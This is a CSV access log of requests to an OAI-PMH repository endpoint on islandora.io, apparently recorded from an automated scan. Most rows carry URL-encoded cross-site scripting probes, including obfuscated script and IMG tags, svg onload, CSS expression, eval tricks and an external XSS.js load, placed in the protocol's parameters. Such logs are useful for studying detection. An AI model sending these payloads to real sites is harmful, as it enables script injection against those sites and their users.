uuid,timestamp,http_status_code,request_url,response_time,http_version
505f54a0-84ee-453c-983b-0fd0540ad124,2025-01-01 17:14:40,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out,57.00 ms,HTTP/1.1
982f3a9f-18bf-4cf1-8d2e-d91dff68841c,2025-01-01 17:14:40,200,http://islandora.io/oai/request?verb=ListSets,53.90 ms,HTTP/1.1
1d87edd1-e24d-4bd0-8f5e-e7cb5b07254d,2025-01-01 17:14:41,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out,60.35 ms,HTTP/1.1
e7f055bb-503c-47ac-b215-bfca6adbe7bd,2025-01-01 17:14:41,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out&set=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out,66.81 ms,HTTP/1.1
408390fa-912b-484c-95f3-05ea9f62bf1a,2025-01-01 17:14:41,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out&metadataPrefix=marc,63.70 ms,HTTP/1.1
ca968b38-fe37-43fd-97b9-88b9923f3a53,2025-01-01 17:14:42,200,http://islandora.io/oai/request?verb=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out,83.52 ms,HTTP/1.1
caff1680-f2f6-44e3-a298-6c49e1955e7b,2025-01-01 17:14:42,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.68 ms,HTTP/1.1
d7dfa15f-2e4a-4f8c-8a7e-647d352268b2,2025-01-01 17:14:42,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out,103.90 ms,HTTP/1.1
70c3e0a9-64b9-40d4-8333-8aea376b39c8,2025-01-01 17:14:43,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out&set=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out,66.56 ms,HTTP/1.1
4e70e752-5714-4ca8-944c-6d51b6e44c73,2025-01-01 17:14:43,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out&until=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out&set=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out,44.52 ms,HTTP/1.1
f8347df9-8498-415a-95d4-a89575f29257,2025-01-01 17:14:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27%3Bprint+%22%3B%3C%3BIM+SRC%3Djava%5C0script%3Aalert%28%22%3BXSS%22%3B%29%3E%22%3B%3B%27%3B%3E%3B+out&metadataPrefix=oai_dc,59.28 ms,HTTP/1.1
5d230273-e20b-43c2-84d9-79e5a9cfd92c,2025-01-01 17:14:44,200,http://islandora.io/oai/request?verb=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out,55.49 ms,HTTP/1.1
c2de3191-b3e0-48e2-a9d7-a38ef4b0fd35,2025-01-01 17:14:44,200,http://islandora.io/oai/request?verb=ListMetadataFormats,57.44 ms,HTTP/1.1
ec7fb274-fc3a-4cf6-97d9-f7a9b5d33e46,2025-01-01 17:14:44,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out,59.30 ms,HTTP/1.1
d8ef8733-0bfa-44f6-b684-320240269e79,2025-01-01 17:14:45,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out&until=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out,53.07 ms,HTTP/1.1
ab79a878-c207-4373-96c2-760cd32b1c14,2025-01-01 17:14:45,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out,85.85 ms,HTTP/1.1
fa91de05-3a9c-4d27-a9ff-bd3eb25e660d,2025-01-01 17:14:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out&metadataPrefix=marc,57.12 ms,HTTP/1.1
90497149-7262-42ea-a746-71d2ddfed078,2025-01-01 17:14:46,200,http://islandora.io/oai/request?verb=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out,62.27 ms,HTTP/1.1
70a46188-e991-4fec-b58c-e212374293c0,2025-01-01 17:14:46,200,http://islandora.io/oai/request?verb=ListMetadataFormats,35.40 ms,HTTP/1.1
9a570243-2d89-4f56-ba08-3dbe0f4ebfe5,2025-01-01 17:14:46,200,http://islandora.io/oai/request?verb=ListSets,53.47 ms,HTTP/1.1
cda649bd-5546-43d3-91b6-35b0ca5ac3e5,2025-01-01 17:14:47,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out,58.88 ms,HTTP/1.1
c4971da2-ebab-461c-bd01-e5c5de41f173,2025-01-01 17:14:47,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out&until=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out&set=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out,86.63 ms,HTTP/1.1
a0a1165c-d899-4df2-be55-8973360ad173,2025-01-01 17:14:48,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27print+%5C%22%26lt%3BIMG+SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27+%26gt%3B+out&metadataPrefix=oai_dc,96.72 ms,HTTP/1.1
1d0f270d-c88a-4f57-9d37-f0c554ead715,2025-01-01 17:14:48,200,http://islandora.io/oai/request?verb=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out,62.53 ms,HTTP/1.1
682dca3a-184c-49d3-909b-d56812b1962b,2025-01-01 17:14:48,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out,59.42 ms,HTTP/1.1
65268e7d-cc3b-47e9-947b-e3a3ef476ea3,2025-01-01 17:14:49,200,http://islandora.io/oai/request?verb=ListSets,45.85 ms,HTTP/1.1
6a78ecf5-1542-4a80-9a76-1a453a5e156a,2025-01-01 17:14:49,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out&set=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out,57.44 ms,HTTP/1.1
7445a2ca-191f-415a-b66e-2b131d5d69bc,2025-01-01 17:14:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out&set=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out,70.10 ms,HTTP/1.1
3f6d2e5e-37b6-4114-a729-3835dd9605b3,2025-01-01 17:14:50,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out&metadataPrefix=marc,55.19 ms,HTTP/1.1
d7ad5eec-6ec0-4951-9e87-1070ad505dd8,2025-01-01 17:14:50,200,http://islandora.io/oai/request?verb=perl+-e+%27print+%5C%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%5C%22%3B%27+%3E+out,59.08 ms,HTTP/1.1
e03b8abc-c63a-4cec-ab67-8bfeb2263e2a,2025-01-01 17:14:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.15 ms,HTTP/1.1
e2aed990-3780-4e49-bd59-539c8dc62c4f,2025-01-01 17:14:51,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%27print+%5C%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%5C%22%3B%27+%3E+out,57.08 ms,HTTP/1.1
fc9b0cca-d473-4e8e-a228-7593c06e804a,2025-01-01 17:14:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,106.59 ms,HTTP/1.1
4bf8763c-ece4-4586-9e15-ec3686bf8ff8,2025-01-01 17:14:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=perl+-e+%27print+%5C%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%5C%22%3B%27+%3E+out&set=perl+-e+%27print+%5C%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%5C%22%3B%27+%3E+out,52.89 ms,HTTP/1.1
d50bf067-e418-4d78-b464-e1b582d3aae2,2025-01-01 17:14:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27print+%5C%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%5C%22%3B%27+%3E+out&metadataPrefix=marc,53.11 ms,HTTP/1.1
2984f914-d09a-4f42-9824-7caa3f3bdc00,2025-01-01 17:14:52,200,http://islandora.io/oai/request?verb=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out,60.44 ms,HTTP/1.1
d90aceb3-0b82-40dc-96c2-54a86bb0b1c4,2025-01-01 17:14:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out,62.31 ms,HTTP/1.1
ef69d450-6e28-473d-ac8e-5486b1013fdc,2025-01-01 17:14:53,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out,69.83 ms,HTTP/1.1
e20fcb2d-53a3-476f-a81b-a5447436d169,2025-01-01 17:14:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out&set=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out,59.99 ms,HTTP/1.1
05c8bc4a-2fdf-4a3e-b9b9-d2f88c23488c,2025-01-01 17:14:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out,62.77 ms,HTTP/1.1
0e628db5-8529-4e88-b723-ee8b6185df91,2025-01-01 17:14:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%27print+%5C%22%3CSCR%5C0IPT%3Ealert%28%5C%22XSS%5C%22%29%3C%2FSCR%5C0IPT%3E%5C%22%3B%27+%3E+out&metadataPrefix=marc,69.77 ms,HTTP/1.1
90d4dd69-b456-4d8a-a12f-f79773368634,2025-01-01 17:14:54,200,http://islandora.io/oai/request?verb=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,58.38 ms,HTTP/1.1
6d36c384-4e65-4e0d-ba6a-a03b71a1357d,2025-01-01 17:14:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,56.52 ms,HTTP/1.1
f647bcb3-24d9-4941-bcd6-9140807717bc,2025-01-01 17:14:55,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,46.19 ms,HTTP/1.1
3ebebf93-291d-4172-972e-d86a51539885,2025-01-01 17:14:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,61.22 ms,HTTP/1.1
96a9252b-9e1c-4d54-bda6-323472c16bf7,2025-01-01 17:14:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E&set=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,62.18 ms,HTTP/1.1
ec4be91d-9229-412c-b0af-e6904a5e85f6,2025-01-01 17:14:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E&metadataPrefix=marc,58.91 ms,HTTP/1.1
ed39a371-c9d1-4a83-93e3-d001a22c1d16,2025-01-01 17:14:56,200,http://islandora.io/oai/request?verb=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F,80.98 ms,HTTP/1.1
c280df0f-8b3e-4c60-8051-c34fb242a995,2025-01-01 17:14:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F,44.67 ms,HTTP/1.1
ef07a4cf-ceda-42e8-9a6e-67de93d1bff3,2025-01-01 17:14:57,200,http://islandora.io/oai/request?verb=ListSets,47.69 ms,HTTP/1.1
93a096e1-83de-4a18-88fa-4e0693e27ef1,2025-01-01 17:14:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F&set=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F,49.97 ms,HTTP/1.1
d2050db2-ac1c-41dd-8d6a-2dd969f632af,2025-01-01 17:14:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F&set=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F,57.32 ms,HTTP/1.1
d0ec080b-d333-4f61-8069-c0add4759fec,2025-01-01 17:14:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=veris--%3Egroup%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%2F%2F&metadataPrefix=oai_dc,75.31 ms,HTTP/1.1
edca9666-301f-44bf-a3fd-1b59f0b9bd98,2025-01-01 17:14:58,200,http://islandora.io/oai/request?verb=window.alert%28%22Bonjour+%21%22%29%3B,58.84 ms,HTTP/1.1
6d496644-ab06-4d2e-9810-f3d8a78cd3c3,2025-01-01 17:14:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.84 ms,HTTP/1.1
32e43518-76d8-4b5a-899b-acd9ee75dd99,2025-01-01 17:14:59,200,http://islandora.io/oai/request?verb=ListSets,52.77 ms,HTTP/1.1
b416f112-1661-4eb6-9df6-fa792dbb94ce,2025-01-01 17:14:59,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=window.alert%28%22Bonjour+%21%22%29%3B,47.49 ms,HTTP/1.1
476140db-1bac-4774-8648-067a9dd8aa0c,2025-01-01 17:14:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=window.alert%28%22Bonjour+%21%22%29%3B&set=window.alert%28%22Bonjour+%21%22%29%3B,33.03 ms,HTTP/1.1
da737d52-e8da-49b4-b267-706f16385314,2025-01-01 17:15:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=window.alert%28%22Bonjour+%21%22%29%3B&metadataPrefix=oai_dc,33.38 ms,HTTP/1.1
dad309c8-2873-486b-a061-ab64f611a512,2025-01-01 17:15:00,200,http://islandora.io/oai/request?verb=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B,62.23 ms,HTTP/1.1
213a1c88-5434-479f-8324-daf036616a09,2025-01-01 17:15:00,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.04 ms,HTTP/1.1
897b172c-ec36-43d9-b763-dd1c6b6b9a7e,2025-01-01 17:15:01,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B,56.22 ms,HTTP/1.1
9aca775b-9880-4d1d-a459-f4d8e9faba2e,2025-01-01 17:15:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B&set=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B,71.43 ms,HTTP/1.1
7eb79151-1052-42b7-8e88-7cf891ad0ca1,2025-01-01 17:15:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B&until=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B&set=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B,74.79 ms,HTTP/1.1
d432c35e-77ea-431f-8b8d-c0a06e1c12f4,2025-01-01 17:15:02,200,http://islandora.io/oai/request?verb=GetRecord&identifier=xss%26%2358%3Bex%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%5C%22XSS%5C%22%29%29%27%26gt%3B&metadataPrefix=marc,92.09 ms,HTTP/1.1
142da21a-3af6-479f-90f2-1820cc5a3022,2025-01-01 17:15:02,200,http://islandora.io/oai/request?verb=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E,56.56 ms,HTTP/1.1
3b31fbda-f8d2-41be-a747-34fedaa8d4d6,2025-01-01 17:15:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E,60.42 ms,HTTP/1.1
ba4df649-aaec-4d9f-9f25-ea58cf9ae696,2025-01-01 17:15:03,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E,81.76 ms,HTTP/1.1
f8790e6f-4d36-4efa-a4d6-df4091b5976b,2025-01-01 17:15:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&until=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E,56.89 ms,HTTP/1.1
cf5f3f77-85a8-4057-a212-75e0d37b1cdb,2025-01-01 17:15:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&until=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&set=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E,42.96 ms,HTTP/1.1
2e81b711-9684-4900-b626-8b0a6242740a,2025-01-01 17:15:04,200,http://islandora.io/oai/request?verb=GetRecord&identifier=xss%3Aex%2F%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&metadataPrefix=oai_dc,62.34 ms,HTTP/1.1
448d18aa-59ac-429f-bd3e-ed5d7f5e9ec5,2025-01-01 17:15:04,200,http://islandora.io/oai/request?verb=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E,62.15 ms,HTTP/1.1
985daca9-76aa-45e1-adce-018bc93668a5,2025-01-01 17:15:05,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E,69.66 ms,HTTP/1.1
684374c8-b502-4321-8e07-80fb21e46eea,2025-01-01 17:15:05,200,http://islandora.io/oai/request?verb=ListSets,53.03 ms,HTTP/1.1
ff779d91-62af-4d04-9643-90a4ada41940,2025-01-01 17:15:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E&set=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E,89.04 ms,HTTP/1.1
e2e9422b-537e-4706-8d1e-123b77b847d9,2025-01-01 17:15:06,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E&set=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E,96.95 ms,HTTP/1.1
3acecbe8-a813-4866-9027-b0b1d0e3f984,2025-01-01 17:15:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%7D%3C%2Fstyle%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28%2FXSS%2F.source%29%29%3B%3C%2Fscript%3E&metadataPrefix=marc,57.09 ms,HTTP/1.1
185a5f4c-4d2b-4045-af68-b5a83942a949,2025-01-01 17:15:06,200,http://islandora.io/oai/request?verb=%C2%BCscript%C2%BEalert%28%C2%A2XSS%C2%A2%29%C2%BC%2Fscript%C2%BE,52.14 ms,HTTP/1.1
0d74567b-b67a-43ac-98fd-2a8e7a6c67ce,2025-01-01 17:15:07,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%C2%BCscript%C2%BEalert%28%C2%A2XSS%C2%A2%29%C2%BC%2Fscript%C2%BE,59.14 ms,HTTP/1.1
